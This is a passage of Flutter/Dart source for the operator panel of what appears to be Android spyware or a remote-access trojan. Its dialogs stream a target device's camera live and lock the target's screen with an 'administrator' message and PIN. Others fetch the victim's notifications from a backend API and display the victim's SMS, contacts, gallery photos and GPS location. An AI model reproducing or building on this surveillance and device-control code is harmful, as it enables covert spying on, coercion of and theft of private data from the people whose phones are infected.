          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.8),
                borderRadius: const BorderRadius.vertical(top: Radius.circular(16)),
                border: const Border(bottom: BorderSide(color: ControlTheme.surface2)),
              ),
              child: Row(children: [
                Container(width: 8, height: 8, decoration: const BoxDecoration(color: ControlTheme.error, shape: BoxShape.circle)),
                const SizedBox(width: 8),
                Text('LIVE — $_liveTitle', style: ControlTextStyle.subheading.copyWith(fontWeight: FontWeight.bold)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(color: ControlTheme.success.withOpacity(0.15), borderRadius: BorderRadius.circular(6), border: Border.all(color: ControlTheme.success.withOpacity(0.4))),
                  child: Text('$_fps fps', style: ControlTextStyle.tiny.copyWith(fontWeight: FontWeight.bold, color: ControlTheme.success))),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.52),
              color: ControlTheme.cardDark,
              child: _frame != null
                  ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
                  : const SizedBox(height: 180, child: Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                      CircularProgressIndicator(color: ControlTheme.accent1, strokeWidth: 2),
                      SizedBox(height: 10),
                      Text('Waiting for frames...', style: TextStyle(color: ControlTheme.textMuted, fontSize: 10)),
                    ]))),
            ),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.8),
                borderRadius: const BorderRadius.vertical(bottom: Radius.circular(16)),
              ),
              child: Row(children: [
                Expanded(child: OutlinedButton.icon(
                  style: OutlinedButton.styleFrom(
                    side: BorderSide(color: ControlTheme.surface3),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                  ),
                  icon: const Icon(Icons.cameraswitch_rounded, color: ControlTheme.textMuted, size: 15),
                  label: Text('Switch', style: ControlTextStyle.small.copyWith(color: ControlTheme.textMuted)),
                  onPressed: () {
                    final isFront = _liveTitle.contains('DEPAN');
                    _stopLive();
                    Future.delayed(const Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                  },
                )),
                const SizedBox(width: 8),
                Expanded(child: ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: ControlTheme.error,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                  ),
                  icon: const Icon(Icons.stop_rounded, color: Colors.white, size: 15),
                  label: Text('Stop', style: ControlTextStyle.button.copyWith(color: Colors.white)),
                  onPressed: () { _stopLive(); Navigator.pop(ctx); },
                )),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: Colors.black.withOpacity(0.95),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      title: Text('Lock Live + Chat', style: ControlTextStyle.heading.copyWith(color: ControlTheme.accent3)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Target locked + two-way chat', style: ControlTextStyle.body.copyWith(color: ControlTheme.textSec)),
        const SizedBox(height: 12),
        _field(msgCtrl, 'Lock screen message', hint: 'This device is locked by administrator'),
        const SizedBox(height: 10),
        _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: ControlTextStyle.body.copyWith(color: ControlTheme.textMuted))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(
            backgroundColor: ControlTheme.accent3,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
          ),
          onPressed: () {
            Navigator.pop(context);
            final msg = msgCtrl.text.trim().isEmpty ? 'DEVICE LOCKED BY ADMINISTRATOR' : msgCtrl.text.trim();
            final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
            _cmd('lock_live', extra: '$msg|$pin');
          },
          child: Text('LOCK LIVE', style: ControlTextStyle.button.copyWith(color: Colors.white))),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => AlertDialog(
        backgroundColor: Colors.black.withOpacity(0.95),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: Text('Select Camera', style: ControlTextStyle.heading),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
          final isSel = sel == v;
          return GestureDetector(
            onTap: () => ss(() => sel = v),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 22, vertical: 14),
              decoration: BoxDecoration(
                color: isSel ? ControlTheme.accent1.withOpacity(0.1) : Colors.transparent,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: isSel ? ControlTheme.accent1 : ControlTheme.surface3)),
              child: Column(children: [
                Icon(v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded, color: isSel ? ControlTheme.accent1 : ControlTheme.textMuted, size: 28),
                const SizedBox(height: 6),
                Text(v == 'back' ? 'Back' : 'Front', style: ControlTextStyle.small.copyWith(color: isSel ? ControlTheme.accent1 : ControlTheme.textMuted, fontWeight: FontWeight.w600)),
              ]),
            ),
          );
        }).toList()),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: Text('Cancel', style: ControlTextStyle.body.copyWith(color: ControlTheme.textMuted))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: ControlTheme.accent1,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () { Navigator.pop(ctx); onPick(sel); },
            child: Text('Select', style: ControlTextStyle.button.copyWith(color: Colors.white))),
        ],
      ),
    ));
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: Colors.black.withOpacity(0.95),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      title: Text(title, style: ControlTextStyle.heading),
      content: _field(ctrl, label, hint: hint, isNum: isNumber),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: ControlTextStyle.body.copyWith(color: ControlTheme.textMuted))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(
            backgroundColor: ControlTheme.accent1,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
          ),
          onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
          child: Text('Send', style: ControlTextStyle.button.copyWith(color: Colors.white))),
      ],
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // DATA DISPLAY
  // ─────────────────────────────────────────────────────────────────────────
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(context: context, backgroundColor: ControlTheme.surface,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
          builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
            builder: (_, sc) => Column(children: [
              Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: ControlTheme.surface3, borderRadius: BorderRadius.circular(2))),
              Text('Notifications', style: ControlTextStyle.heading),
              const SizedBox(height: 8),
              Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: list.length, separatorBuilder: (_, __) => Divider(color: ControlTheme.surface3, height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                  leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: ControlTheme.accent3.withOpacity(0.15), borderRadius: BorderRadius.circular(8)),
                    child: const Icon(Icons.notifications_rounded, color: ControlTheme.accent3, size: 18)),
                  title: Text(list[i]['title']?.toString() ?? '-', style: ControlTextStyle.body.copyWith(fontWeight: FontWeight.w600)),
                  subtitle: Text(list[i]['body']?.toString() ?? '', style: ControlTextStyle.tiny.copyWith(color: ControlTheme.textMuted))),
              )),
            ]),
          ));
      }
    } catch (_) { _addLog('Notif error'); }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: ControlTheme.bg, insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(14),
            child: Text(title, style: ControlTextStyle.heading)),
          ClipRRect(borderRadius: const BorderRadius.vertical(bottom: Radius.circular(16)),
            child: Image.memory(bytes, fit: BoxFit.contain)),
        ]),
      ));
    } catch (_) { _toast('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: Colors.black.withOpacity(0.95),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      title: Text('GPS Location', style: ControlTextStyle.heading),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        Text('Latitude:  $lat', style: ControlTextStyle.body.copyWith(color: ControlTheme.success)),
        const SizedBox(height: 4),
        Text('Longitude: $lng', style: ControlTextStyle.body.copyWith(color: ControlTheme.success)),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: ControlTextStyle.body.copyWith(color: ControlTheme.textMuted))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(
            backgroundColor: ControlTheme.success,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
          ),
          onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication),
          child: Text('Open Maps', style: ControlTextStyle.button.copyWith(color: Colors.white))),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: Colors.black.withOpacity(0.95),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      title: Text(title, style: ControlTextStyle.heading),
      content: Container(padding: const EdgeInsets.all(12), decoration: BoxDecoration(color: ControlTheme.bg, borderRadius: BorderRadius.circular(8)),
        child: SelectableText(content, style: ControlTextStyle.body.copyWith(color: ControlTheme.success))),
      actions: [TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: ControlTextStyle.body.copyWith(color: ControlTheme.textMuted)))],
    ));
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(context: context, backgroundColor: ControlTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: ControlTheme.surface3, borderRadius: BorderRadius.circular(2))),
          Text('Contacts (${contacts.length})', style: ControlTextStyle.heading),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: contacts.length, separatorBuilder: (_, __) => Divider(color: ControlTheme.surface3, height: 1),
            itemBuilder: (_, i) => ListTile(
              contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 2),
              leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: ControlTheme.accent3.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                child: const Icon(Icons.person_rounded, color: ControlTheme.accent3, size: 18)),
              title: Text(contacts[i]['name']?.toString() ?? '-', style: ControlTextStyle.body),
              subtitle: Text(contacts[i]['number']?.toString() ?? '-', style: ControlTextStyle.tiny.copyWith(color: ControlTheme.textMuted))),
          )),
        ]),
      ));
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(context: context, backgroundColor: ControlTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: ControlTheme.surface3, borderRadius: BorderRadius.circular(2))),
          Text('SMS (${sms.length})', style: ControlTextStyle.heading),
          const SizedBox(height: 8),
          Expanded(child: ListView.separated(controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
            itemCount: sms.length, separatorBuilder: (_, __) => Divider(color: ControlTheme.surface3, height: 1),
            itemBuilder: (_, i) {
              final s = sms[i] as Map;
              return ListTile(
                contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                leading: Container(width: 36, height: 36, decoration: BoxDecoration(color: ControlTheme.accent2.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                  child: const Icon(Icons.sms_rounded, color: ControlTheme.accent2, size: 18)),
                title: Text(s['address']?.toString() ?? '-', style: ControlTextStyle.body.copyWith(fontWeight: FontWeight.w600)),
                subtitle: Text(s['body']?.toString() ?? '', style: ControlTextStyle.tiny.copyWith(color: ControlTheme.textMuted), maxLines: 2, overflow: TextOverflow.ellipsis));
            })),
        ]),
      ));
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(context: context, backgroundColor: ControlTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => DraggableScrollableSheet(initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
        builder: (_, sc) => Column(children: [
          Container(height: 4, width: 36, margin: const EdgeInsets.only(top: 10, bottom: 8), decoration: BoxDecoration(color: ControlTheme.surface3, borderRadius: BorderRadius.circular(2))),
          Text('Gallery (${imgs.length})', style: ControlTextStyle.heading),
          const SizedBox(height: 8),
          Expanded(child: imgs.isEmpty
              ? Center(child: Text('No photos', style: ControlTextStyle.body.copyWith(color: ControlTheme.textMuted)))
              : GridView.builder(controller: sc, padding: const EdgeInsets.all(10),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 4, mainAxisSpacing: 4),
                  itemCount: imgs.length,
                  itemBuilder: (_, i) {
                    try {
                      final raw = imgs[i].toString();
                      final clean = raw.contains(',') ? raw.split(',').last : raw;
                      final bytes = base64Decode(clean);
                      return GestureDetector(
                        onTap: () => _imgDialog(raw, 'Gallery Photo ${i+1}'),
                        child: ClipRRect(borderRadius: BorderRadius.circular(6),
                          child: Image.memory(bytes, fit: BoxFit.cover)));
                    } catch (_) { return Container(decoration: BoxDecoration(color: ControlTheme.bg, borderRadius: BorderRadius.circular(6))); }
                  })),
        ]),
      ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // UI HELPERS
  // ─────────────────────────────────────────────────────────────────────────
  Widget _infoRow(String num, String text) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 3),
    child: Row(children: [
      Container(width: 20, height: 20, decoration: BoxDecoration(color: ControlTheme.warning.withOpacity(0.1), borderRadius: BorderRadius.circular(4)),
        child: Center(child: Text(num, style: ControlTextStyle.tiny.copyWith(fontWeight: FontWeight.bold, color: ControlTheme.warning)))),
      const SizedBox(width: 10),
      Expanded(child: Text(text, style: ControlTextStyle.tiny.copyWith(color: ControlTheme.textMuted))),
    ]),
  );

  Widget _field(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: ControlTextStyle.body.copyWith(color: ControlTheme.textPrimary),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: ControlTextStyle.tiny.copyWith(color: ControlTheme.textMuted),
        hintStyle: ControlTextStyle.tiny.copyWith(color: ControlTheme.textMuted),
        filled: true, fillColor: ControlTheme.bg,
        contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: ControlTheme.surface3)),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: ControlTheme.surface3)),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: ControlTheme.accent1)),
      ),
    );
}

class _GridButton {
  final String label;
  final Color color;
  final IconData icon;
  final VoidCallback onTap;
  
  _GridButton(this.label, this.color, this.icon, this.onTap);
}